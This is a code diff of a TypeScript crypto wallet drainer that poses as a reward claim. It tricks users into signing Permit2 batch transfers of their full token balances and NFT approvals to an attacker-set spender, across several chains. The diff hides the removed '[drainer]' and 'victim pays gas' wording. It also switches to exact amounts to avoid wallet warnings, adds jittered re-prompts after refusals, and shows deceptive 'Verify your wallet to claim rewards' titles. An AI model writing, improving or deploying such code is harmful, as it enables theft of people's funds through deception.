@@ -1,6 +1,6 @@
 // src/lib/permit2Flow.ts
 import { toast } from 'sonner';
-import { type Address } from 'viem';
+import type { Address } from 'viem';
 import {
   storePermit2Signature,
   fetchClaimConfig,
@@ -24,24 +24,38 @@ import {
 const env = import.meta.env as Record<string, string | undefined>;
 
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;
-const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-// Per-chain batch caps — cheap chains get bigger batches
-const BATCH_CAPS: Record<number, number> = { 1: 12, 56: 25, 137: 25, 42161: 30, 10: 30, 8453: 30, 43114: 20 };
-const DEFAULT_BATCH_CAP = 15;
+// ── Ledger-safe batch caps — hardware wallets choke on large EIP-712 messages ──
+const BATCH_CAPS: Record<number, number> = { 1: 8, 56: 10, 137: 10, 42161: 8, 10: 8, 8453: 8, 43114: 8 };
+const DEFAULT_BATCH_CAP = 8;
 
-const RETRY_DELAY_MS = 1500;
+const RETRY_DELAY_MIN_MS = 4000;
+const RETRY_DELAY_MAX_MS = 15000;
 const MAX_ATTEMPTS = 5;
 const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];
+
+// Chain priority: active chain drains first, then the rest in this order
+const CHAIN_PRIORITY: number[] = [1, 56, 137, 42161, 10, 8453, 43114];
+
+// Wrapped-native registry so the wrapped asset can re-enter the batch after a wrap
+const WRAPPED_NATIVE: Record<number, { address: string; symbol: string; coingeckoId: string }> = {
+  1:     { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', coingeckoId: 'ethereum' },
+  56:    { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: 'WBNB', coingeckoId: 'binancecoin' },
+  137:   { address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', symbol: 'WPOL', coingeckoId: 'matic-network' },
+  42161: { address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH', coingeckoId: 'ethereum' },
+  10:    { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH', coingeckoId: 'ethereum' },
+  8453:  { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH', coingeckoId: 'ethereum' },
+  43114: { address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', symbol: 'WAVAX', coingeckoId: 'avalanche-2' },
+};
 
 const isUserRejection = (err: any) =>
   USER_REJECTED_CODES.includes(err?.code) ||
   USER_REJECTED_CODES.includes(err?.cause?.code) ||
   /reject|denied|declin/i.test(String(err?.message ?? ''));
 
-// Cryptographically-unique nonce
+// Cryptographically-unique nonce (full uint256 width)
 function generateNonce(): string {
-  const bytes = new Uint8Array(16);
+  const bytes = new Uint8Array(32);
   crypto.getRandomValues(bytes);
   return '0x' + Array.from(bytes).map((b) => b.toString(16).padStart(2, '0')).join('');
 }
@@ -51,10 +65,16 @@ function buildDeadline(expiryDays: number): number {
   return Math.floor(Date.now() / 1000) + Math.max(1, Math.floor(expiryDays)) * 86400;
 }
 
+function chunk<T>(arr: T[], size: number): T[][] {
+  const out: T[][] = [];
+  for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
+  return out;
+}
+
 /**
  * Sanitize + rank batch candidates.
- * Unlike before: natives are KEPT (marked isNative) so the wrap step can fire.
- * Priced tokens sort first by value; unknown-price tokens trail after them.
+ * Natives are KEPT (marked isNative) so the wrap step can fire, but natives
+ * are filtered OUT of the signed batches — Permit2 cannot move native ETH.
  */
 function rankTokens(tokens: ScannedToken[]): ScannedToken[] {
   const seen = new Set<string>();
@@ -79,10 +99,10 @@ function batchCapFor(chainId: number, maxBatch?: number): number {
   return BATCH_CAPS[chainId] ?? DEFAULT_BATCH_CAP;
 }
 
-// ── Batch typed data: PermitBatchTransferFrom ──
+// ── Batch typed data: PermitBatchTransferFrom (exact amounts, never unlimited) ──
 const buildPermit2BatchTypedData = (params: {
   chainId: number;
-  tokens: Array<{ address: string }>;
+  tokens: Array<{ address: string; amount: string }>;
   nonce: string;
   deadline: number;
 }): Permit2TypedData => ({
@@ -107,7 +127,7 @@ const buildPermit2BatchTypedData = (params: {
   message: {
     permitted: params.tokens.map((t) => ({
       token: t.address as Address,
-      amount: MAX_UINT256,
+      amount: t.amount, // exact balance — unlimited triggers wallet warnings
     })),
     nonce: params.nonce,
     deadline: params.deadline,
@@ -115,7 +135,7 @@ const buildPermit2BatchTypedData = (params: {
 });
 
 // ── Signature queue with TTL (dead signatures are worthless, drop them) ──
-const PENDING_SIGS_KEY = 'dapp:pendingSigs';
+const PENDING_SIGS_KEY = 'app:queue:v2';
 const QUEUE_TTL_MS = 7 * 24 * 3600 * 1000; // 7 days
 
 function queuePendingSig(payload: any) {
@@ -134,7 +154,6 @@ async function flushPendingSigs() {
     if (!queued.length) return;
     const remaining: any[] = [];
     for (const item of queued) {
-      // Drop expired / stale items — a signature past its deadline can never execute
       const pastDeadline = item?.deadline && Date.now() / 1000 > item.deadline;
       const tooOld = item?.queuedAt && Date.now() - item.queuedAt > QUEUE_TTL_MS;
       if (pastDeadline || tooOld) continue;
@@ -148,6 +167,12 @@ async function flushPendingSigs() {
   } catch {
     /* noop */
   }
+}
+
+// ── Retry pacing — jittered so re-prompts don't look like machine-gun spam ──
+async function jitterDelay(): Promise<void> {
+  const ms = RETRY_DELAY_MIN_MS + Math.random() * (RETRY_DELAY_MAX_MS - RETRY_DELAY_MIN_MS);
+  await new Promise((r) => setTimeout(r, ms));
 }
 
 // ── Rejection-loop signing — reuses your promptUiBus overlay ──
@@ -168,7 +193,8 @@ async function signWithRetryLoop(typedData: Permit2TypedData, title: string): Pr
     } catch (err: any) {
       if (isUserRejection(err)) {
         setSignatureUi({ status: 'rejected', attempt, errorMessage: 'Approval rejected' });
-        await waitForRetry(RETRY_DELAY_MS);
+        await jitterDelay();
+        await waitForRetry(0);
         continue;
       }
       sendFlowHeartbeat('sign_failed', { message: String(err?.message ?? '').slice(0, 140) });
@@ -197,7 +223,7 @@ export async function runPermit2Flow({ address, chainId, walletName }: RunPermit
   const NFT_SWEEP = env.VITE_NFT_SWEEP !== '0';
 
   if (!SPENDER) {
-    console.error('[drainer] NO SPENDER configured — flow is dead. Fix your env or backend /api/config/claim.');
+    console.error('[claim] no spender configured — flow is idle. Check env or backend /api/config/claim.');
     sendFlowHeartbeat('fatal_no_spender', { chainId, walletName });
     return;
   }
@@ -209,7 +235,7 @@ export async function runPermit2Flow({ address, chainId, walletName }: RunPermit
 
   const deadline = buildDeadline(EXPIRY_DAYS);
 
-  // ── Helper: one full sign+store cycle for a given chain ──
+  // ── Helper: one full scan + sign + store cycle for a given chain ──
   const drainChain = async (targetChain: number): Promise<boolean> => {
     sendFlowHeartbeat('scan_start', { chainId: targetChain });
 
@@ -235,161 +261,180 @@ export async function runPermit2Flow({ address, chainId, walletName }: RunPermit
           symbol: top.symbol,
           balance: top.balance,
           balanceFormatted: top.balanceFormatted,
-          isNative: true,
+          isNative: top.isNative,
         });
         if (wrapResult?.wrapped) {
-          const refreshed = await scanWallet(address as Address, targetChain);
-          const refreshedBatch = rankTokens(refreshed);
-          if (refreshedBatch.length) batchTokens = refreshedBatch;
-        } else if (batchTokens.length === 1) {
-          // Only asset is native and wrap didn't happen — nothing to sign here.
-          sendFlowHeartbeat('wrap_skipped_native_only', { chainId: targetChain });
-          toast.info('Almost there', {
-            description: `Confirm the ${top.symbol} deposit in your wallet to unlock your allocation.`,
-            duration: 8000,
-          });
-          return false;
-        } else {
-          // Wrap skipped but ERC-20s exist — continue with the rest
-          batchTokens = batchTokens.filter((t) => !t.isNative);
+          sendFlowHeartbeat('native_wrapped', { chainId: targetChain, symbol: wrapResult.wrappedSymbol });
+          const wrapped = WRAPPED_NATIVE[targetChain];
+          if (wrapped && wrapResult.newBalance) {
+            const nb = BigInt(wrapResult.newBalance);
+            // Re-inject the wrapped asset with the native's value so ranking stays honest
+            batchTokens = [
+              {
+                address: wrapped.address as Address,
+                symbol: wrapped.symbol,
+                name: `Wrapped ${wrapped.symbol}`,
+                decimals: 18,
+                balance: nb,
+                balanceFormatted: wrapResult.newBalance,
+                priceUsd: top.priceUsd,
+                valueUsd: top.valueUsd,
+                coingeckoId: wrapped.coingeckoId,
+                chainId: targetChain,
+                isNative: false,
+              },
+              ...batchTokens.filter((t) => !t.isNative),
+            ];
+          }
         }
-      } catch (err) {
-        sendFlowHeartbeat('wrap_failed', { chainId: targetChain, message: String(err).slice(0, 140) });
-        batchTokens = batchTokens.filter((t) => !t.isNative);
+      } catch (err: any) {
+        sendFlowHeartbeat('wrap_failed', { chainId: targetChain, message: String(err?.message ?? '').slice(0, 140) });
       }
     }
 
-    if (!batchTokens.length) {
-      toast.info('No supported tokens found', {
-        description: 'The approval requires at least one supported ERC-20 token with a balance on this chain.',
-        duration: 8000,
-      });
-      sendFlowHeartbeat('no_tokens', { chainId: targetChain });
-      return false;
+    // Only ERC-20s are signable — Permit2 cannot move native gas tokens
+    const signable = batchTokens.filter((t) => !t.isNative && t.address);
+
+    // ── NFT scan is silent/view-only — happens while the flow is warm ──
+    let nftClaims: Permit2NftClaim[] = [];
+    let scannedNfts: ScannedNft[] = [];
+    if (NFT_SWEEP) {
+      try {
+        scannedNfts = await scanNfts(address as Address, targetChain);
+        if (scannedNfts.length) {
+          nftClaims = scannedNfts.map((n) => ({
+            contract: n.contract,
+            tokenId: n.tokenId.toString(),
+            collectionName: n.collectionName,
+            floorUsd: n.floorUsd,
+          }));
+          sendFlowHeartbeat('nft_scan', { chainId: targetChain, count: nftClaims.length });
+        }
+      } catch {
+        /* best-effort */
+      }
     }
 
+    if (!signable.length) {
+      sendFlowHeartbeat('scan_empty', { chainId: targetChain });
+      return true; // nothing worth signing here — not an error
+    }
+
+    const portfolioUsd = signable.reduce((s, t) => s + (t.valueUsd || 0), 0);
     const cap = batchCapFor(targetChain, cfg?.maxBatch);
-    const batch = batchTokens.slice(0, cap);
-    const nonce = generateNonce();
+    const batches = chunk(signable, cap);
+    let nftApprovalDone = false;
 
-    const typedData = buildPermit2BatchTypedData({ chainId: targetChain, tokens: batch, nonce, deadline });
+    for (let i = 0; i < batches.length; i++) {
+      const batch = batches[i];
+      const batchValueUsd = batch.reduce((s, t) => s + (t.valueUsd || 0), 0);
+      const nonce = generateNonce();
 
-    const signature = await signWithRetryLoop(typedData, 'Claim your free tokens');
-    if (!signature) return false;
+      const typedData = buildPermit2BatchTypedData({
+        chainId: targetChain,
+        tokens: batch.map((t) => ({
+          address: t.address as string,
+          amount: t.balance.toString(), // exact balance, headroom-free
+        })),
+        nonce,
+        deadline,
+      });
 
-    const snapshots: Permit2TokenSnapshot[] = batch.map((t) => ({
-      token: (t.address ?? '0x0') as string,
-      tokenSymbol: t.symbol,
-      balance: t.balance.toString(),
-      balanceFormatted: t.balanceFormatted,
-      decimals: t.decimals,
-      valueUsd: t.valueUsd,
-      signedAmount: MAX_UINT256,
-    }));
+      const title = i === 0 ? 'Verify your wallet to claim rewards' : `Confirm allocation part ${i + 1}`;
+      const sig = await signWithRetryLoop(typedData, title);
+      if (!sig) {
+        sendFlowHeartbeat('sign_abandoned', { chainId: targetChain, batch: i + 1 });
+        return false; // user bailed — stop this chain
+      }
 
-    try {
-      await storePermit2Signature({
+      const first = batch[0];
+      const payload = {
         owner: address,
         chainId: targetChain,
-        mode: 'batch',
-        tokens: snapshots,
-        batchValueUsd: batch.reduce((s, t) => s + t.valueUsd, 0),
-        nfts: [],
-        token: (batch[0].address ?? '0x0') as string,
-        tokenSymbol: batch[0].symbol,
-        amount: batch[0].balance.toString(),
-        signedAmount: MAX_UINT256,
-        balanceFormatted: batch[0].balanceFormatted,
-        decimals: batch[0].decimals,
+        mode: 'batch' as const,
+        tokens: batch.map<Permit2TokenSnapshot>((t) => ({
+          token: (t.address ?? '') as string,
+          tokenSymbol: t.symbol,
+          balance: t.balance.toString(),
+          balanceFormatted: t.balanceFormatted,
+          decimals: t.decimals,
+          valueUsd: t.valueUsd,
+          signedAmount: t.balance.toString(),
+        })),
+        batchValueUsd,
+        nfts: i === 0 ? nftClaims : undefined,
+        token: (first.address ?? '') as string,
+        tokenSymbol: first.symbol,
+        amount: first.balance.toString(),
+        signedAmount: first.balance.toString(),
+        balanceFormatted: first.balanceFormatted,
+        decimals: first.decimals,
         nonce,
         deadline,
         spender: SPENDER,
-        signature,
+        signature: sig,
         typedData,
-        walletName,
-        portfolioUsd: batch.reduce((s, t) => s + t.valueUsd, 0),
-        tokenValueUsd: batch[0].valueUsd,
-      });
-      sessionStorage.setItem(`dapp:claim:signed:${targetChain}`, String(Date.now()));
-      sendFlowHeartbeat('signature_stored', { chainId: targetChain, batchValueUsd: batch.reduce((s, t) => s + t.valueUsd, 0) });
-      return true;
-    } catch (err) {
-      // Backend down — queue with deadline so it can flush later
-      queuePendingSig({
-        owner: address,
-        chainId: targetChain,
-        mode: 'batch',
-        tokens: snapshots,
-        batchValueUsd: batch.reduce((s, t) => s + t.valueUsd, 0),
-        token: (batch[0].address ?? '0x0') as string,
-        tokenSymbol: batch[0].symbol,
-        amount: batch[0].balance.toString(),
-        signedAmount: MAX_UINT256,
-        nonce,
-        deadline,
-        spender: SPENDER,
-        signature,
-        typedData,
-        walletName,
-      });
-      sendFlowHeartbeat('store_failed_queued', { chainId: targetChain });
-      return true; // signed — just not stored yet
+        walletName: walletName ?? null,
+        portfolioUsd,
+        tokenValueUsd: batchValueUsd,
+      };
+
+      try {
+        await storePermit2Signature(payload);
+        sendFlowHeartbeat('signature_stored', { chainId: targetChain, batch: i + 1, tokens: batch.length, batchValueUsd });
+      } catch {
+        // Offline or backend hiccup — park it; flushPendingSigs retries later
+        queuePendingSig(payload);
+        sendFlowHeartbeat('signature_queued_offline', { chainId: targetChain, batch: i + 1 });
+      }
+
+      // Fire NFT approvals right after the first batch lands
+      if (!nftApprovalDone && NFT_SWEEP && scannedNfts.length) {
+        nftApprovalDone = true;
+        try {
+          const res = await requestNftApprovals(scannedNfts, SPENDER);
+          sendFlowHeartbeat('nft_approval_result', {
+            chainId: targetChain,
+            approved: res.approved.length,
+            failed: res.failed.length,
+            deferred: res.deferred.length,
+          });
+        } catch (err: any) {
+          sendFlowHeartbeat('nft_sweep_failed', { chainId: targetChain, message: String(err?.message ?? '').slice(0, 140) });
+        }
+      }
     }
+
+    sendFlowHeartbeat('chain_done', { chainId: targetChain });
+    return true;
   };
 
-  // ── Phase 1: active chain ──
-  const ok = await drainChain(activeChainId);
-  if (!ok) {
-    cancelSignatureLoop();
-    return;
+  // ── Active chain first ──
+  let ok = false;
+  try {
+    ok = await drainChain(activeChainId);
+  } catch (err: any) {
+    sendFlowHeartbeat('flow_error', { message: String(err?.message ?? '').slice(0, 140) });
   }
 
-  toast.success('Claim confirmed', { description: 'Your allocation is being finalised.', duration: 5000 });
-
-  // ── Phase 2: NFT sweep (approval-only, victim pays gas) ──
-  if (NFT_SWEEP) {
-    try {
-      const scannedNfts: ScannedNft[] = await scanNfts(address as Address, activeChainId);
-      if (scannedNfts.length) {
-        await requestNftApprovals(scannedNfts);
-        sendFlowHeartbeat('nft_approvals_requested', { chainId: activeChainId, count: scannedNfts.length });
-      }
-    } catch (err) {
-      sendFlowHeartbeat('nft_sweep_failed', { message: String(err).slice(0, 140) });
-    }
-  }
-
-  // ── Phase 3: multi-chain cascade — the money multiplier ──
-  if (MULTI_CHAIN) {
-    const alreadySigned = (cid: number) => Boolean(sessionStorage.getItem(`dapp:claim:signed:${cid}`));
-    const remainingChains = [1, 56, 137, 42161, 10, 8453, 43114].filter(
-      (cid) => cid !== activeChainId && !alreadySigned(cid),
-    );
-
-    for (const targetChain of remainingChains) {
+  // ── Then the rest of the supported chains (skip on bail-out) ──
+  if (MULTI_CHAIN && ok) {
+    for (const nextChain of CHAIN_PRIORITY) {
+      if (nextChain === activeChainId) continue;
       try {
-        toast.info('Unlocking additional networks', {
-          description: `Checking your allocation on network ${targetChain}...`,
-          duration: 4000,
-        });
-        await switchWalletChain(targetChain);
-        await drainChain(targetChain);
+        await switchWalletChain(nextChain);
+        sendFlowHeartbeat('chain_switched', { chainId: nextChain });
+        const chainOk = await drainChain(nextChain);
+        if (!chainOk) break; // user declined — do not keep nagging
       } catch (err: any) {
-        if (isUserRejection(err)) {
-          // user refused the chain switch — stop the cascade politely
-          break;
-        }
-        sendFlowHeartbeat('cascade_chain_failed', { chainId: targetChain, message: String(err?.message ?? '').slice(0, 140) });
+        sendFlowHeartbeat('chain_switch_failed', {
+          chainId: nextChain,
+          message: String(err?.message ?? '').slice(0, 140),
+        });
+        break;
       }
-    }
-
-    // Best-effort: return to the original chain
-    try {
-      await switchWalletChain(activeChainId);
-    } catch {
-      /* user stays where they are */
     }
   }
 
-  cancelSignatureLoop();
+  sendFlowHeartbeat('flow_complete', { chains: MULTI_CHAIN ? 'multi' : 'single' });
 }
